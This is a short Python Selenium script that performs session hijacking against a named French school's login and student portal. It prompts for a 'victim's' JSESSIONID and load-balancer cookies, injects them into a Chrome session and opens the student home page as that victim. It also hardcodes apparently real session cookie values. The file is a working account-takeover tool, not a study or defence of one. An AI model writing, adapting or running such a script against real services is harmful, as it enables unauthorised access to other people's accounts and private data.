from selenium import webdriver


ent_cookies = [
    {
        'domain': 'wayf.cesi.fr',
        'httpOnly': True,
        'name': 'BIGipServer~ADMIN~pool-WAYF-https',
        'path': '/',
        'sameSite': 'Lax',
        'secure': True,
        'value': 'rd1o00000000000000000000ffff0a601a38o443'
    },
    {
        'domain': 'wayf.cesi.fr',
        'httpOnly': True,
        'name': 'JSESSIONID',
        'path': '/',
        'sameSite': 'Lax',
        'secure': True,
        'value': 'D79FC9A63135FE00021A7540E5B0C029'
    }
]

ent_url = "https://wayf.cesi.fr/login?service=https%3A%2F%2Fent.cesi.fr%2Fservlet%2Fcom.jsbsoft.jtf.core.SG%3FPROC%3DIDENTIFICATION_FRONT"
ent_accueil_url = "https://ent.cesi.fr/accueil-apprenant"


print("please enter victim's cookies : ")
BIGipServer = input("BIGipServer~ADMIN~pool-WAYF-https > ").replace(' ', '')
JSESSIONID = input("JSESSIONID > ").replace(' ', '')

print("Launching browser...")
# Open a driver, get a page, save cookies
driver = webdriver.Chrome()
driver.get(ent_url)
default_cookies = driver.get_cookies()
print(default_cookies)
# replace the values
driver.delete_all_cookies()
for cookie in default_cookies:
    if cookie['name'] == 'BIGipServer~ADMIN~pool-WAYF-https':
        cookie['value'] = BIGipServer
    elif cookie['name'] == 'JSESSIONID':
        cookie['value'] = JSESSIONID

    driver.add_cookie(cookie)

print(driver.get_cookies())
driver.get(ent_accueil_url)